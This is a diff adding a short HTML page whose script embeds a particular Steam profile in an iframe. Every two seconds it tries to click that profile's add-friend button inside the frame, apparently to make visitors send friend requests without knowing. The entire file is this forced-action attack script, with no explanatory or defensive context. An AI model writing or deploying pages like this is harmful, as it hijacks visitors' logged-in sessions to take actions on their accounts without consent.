@@ -1,0 +1,18 @@
+<html>
+<body>
+    <script>
+    var x = document.createElement("IFRAME");
+    x.setAttribute("src", "https://steamcommunity.com/profiles/76561199074993415");
+    x.setAttribute("id", "btnfuck");
+    document.body.appendChild(x);
+
+    window.onload = function(){
+        setInterval(function(){ 
+        var ok = document.getElementById("btnfuck");
+        var frameDoc = ok.contentWindow.document;
+        frameDoc.getElementById("btn_add_friend").click();
+          },2000);
+    };
+    </script>
+</body>
+</html>
